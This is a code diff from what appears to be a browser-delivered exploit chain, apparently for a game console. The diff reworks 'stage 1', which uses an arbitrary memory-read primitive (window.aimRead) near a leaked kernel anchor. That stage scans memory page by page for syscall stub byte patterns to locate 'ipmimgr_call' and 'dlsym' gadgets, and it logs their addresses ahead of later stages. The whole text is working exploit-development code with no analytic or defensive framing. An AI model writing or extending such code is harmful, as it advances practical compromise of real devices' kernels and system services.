@@ -50,30 +50,33 @@
     if (info.kernelBase && info.getpidAddress) anchors.push(Number(info.getpidAddress));
     const WANT = { ipmimgr_call: 0x26e, dlsym: 0x24e };
     const found = {};
-    if (anchors.length && window.readBytes) {
-        const kb = Number(info.kernelBase);
+    if (anchors.length && window.aimRead) {
         const center = anchors[0];
-        const lo = Math.max(kb, center - 0x20000);
-        const sz  = 0x40000;
-        let blob;
-        try { blob = window.readBytes(lo, sz); } catch (e) { blob = null; }
-        if (blob) {
+        const lo = center - 0x20000;
+        const foundAny = {};
+        outer: for (let w = 0; w < 0x40000; w += 0x1000) {
+            let blob;
+            try { blob = window.aimRead(lo + w, 0x1000); } catch (e) { continue; }
+            if (!blob) continue;
             for (const [name, nr] of Object.entries(WANT)) {
+                if (foundAny[name]) continue;
                 const pat = [0xb8, nr & 0xFF, (nr >> 8) & 0xFF, 0x00, 0x00, 0x0f, 0x05];
-                outer: for (let i = 0; i + 7 <= blob.length; i++) {
+                inner: for (let i = 0; i + 7 <= blob.length; i++) {
                     for (let j = 0; j < pat.length; j++)
-                        if (blob[i + j] !== pat[j]) continue outer;
-                    found[name] = lo + i;
+                        if (blob[i + j] !== pat[j]) continue inner;
+                    found[name] = lo + w + i;
+                    foundAny[name] = true;
                     break;
                 }
             }
+            if (Object.keys(foundAny).length === Object.keys(WANT).length) break;
         }
         for (const [name, a] of Object.entries(found))
             log("[SCP] stage1 stub " + name + " @ " + hx(a));
         for (const name of Object.keys(WANT))
             if (!(name in found)) log("[SCP] stage1 stub " + name + ": NOT FOUND in scan window");
     } else {
-        log("[SCP] stage1 skipped (need readBytes + getpid anchor)");
+        log("[SCP] stage1 skipped (need window.aimRead + getpid anchor — update exploit.js if missing)");
     }
 
     // ---- Stage 2: reachability probes (null args; no traffic) ---------------
